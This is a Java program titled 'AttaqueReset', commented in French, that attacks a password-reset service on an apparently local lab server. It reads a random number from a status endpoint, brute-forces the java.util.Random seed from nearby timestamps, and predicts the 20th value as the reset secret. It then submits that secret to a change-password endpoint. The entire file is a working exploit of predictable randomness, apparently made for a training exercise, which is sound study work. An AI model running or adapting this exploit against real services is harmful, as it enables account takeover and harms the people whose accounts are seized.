// Documentation officielle Java BufferedReader : https://docs.oracle.com/en/java/javase/17/docs/api/java.base/java/io/BufferedReader.html
import java.io.BufferedReader;
// Documentation officielle Java InputStreamReader : https://docs.oracle.com/en/java/javase/17/docs/api/java.base/java/io/InputStreamReader.html
import java.io.InputStreamReader;
// Documentation officielle Java HttpURLConnection : https://docs.oracle.com/en/java/javase/17/docs/api/java.base/java/net/HttpURLConnection.html
import java.net.HttpURLConnection;
// Documentation officielle Java URL : https://docs.oracle.com/en/java/javase/17/docs/api/java.base/java/net/URL.html
import java.net.URL;
import java.util.Random;

public class AttaqueReset {
    public static void main(String[] args) {
        String urlStatut = "http://192.168.1.209:4444/resetpasswordstatus";
        
        try {
            System.out.println("Récupération des nombres aléatoires...");
            
            // Connexion au serveur pour récupérer le JSON via URL et HttpURLConnection
            URL url = new URL(urlStatut);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            
            BufferedReader lecteur = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            String reponseJson = lecteur.readLine(); // Le JSON est sur une seule ligne
            lecteur.close();
            
            String cherche = "\"randomNumber1\":\"";
            int debut = reponseJson.indexOf(cherche) + cherche.length();
            int fin = reponseJson.indexOf("\"", debut);
            long premierNombreAttendu = Long.parseLong(reponseJson.substring(debut, fin));
            
            System.out.println("Premier nombre repéré : " + premierNombreAttendu);
            
            long tempsActuel = System.currentTimeMillis();
            long bonSeed = -1;
            
            System.out.println("Recherche du seed par test des horodatages récents...");
            
            for (long seed = tempsActuel - 10000; seed <= tempsActuel + 10000; seed++) {
                Random generateurTest = new Random(seed);
                if (generateurTest.nextInt() == premierNombreAttendu) {
                    bonSeed = seed;
                    break;
                }
            }
            
            if (bonSeed != -1) {
                System.out.println("Seed trouvé avec succès !");
                
                Random generateurFinal = new Random(bonSeed);
                for (int i = 0; i < 19; i++) {
                    generateurFinal.nextInt();
                }
                int secretR20 = generateurFinal.nextInt(); // Le 20e nombre
                
                System.out.println("Le secret (randomNumber20) est : " + secretR20);
                
                String urlChangement = "http://192.168.1.209:4444/changepassword?secret=" + secretR20;
                System.out.println("Envoi de la requête au serveur...");
                
                URL urlReq = new URL(urlChangement);
                HttpURLConnection connReq = (HttpURLConnection) urlReq.openConnection();
                connReq.setRequestMethod("GET");
                
                BufferedReader lecteurReponse = new BufferedReader(new InputStreamReader(connReq.getInputStream()));
                String ligne;
                while ((ligne = lecteurReponse.readLine()) != null) {
                    System.out.println("\nRÉSULTAT DU SERVEUR : " + ligne);
                }
                lecteurReponse.close();
                
            } else {
                System.out.println("Impossible de retrouver le seed.");
            }
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}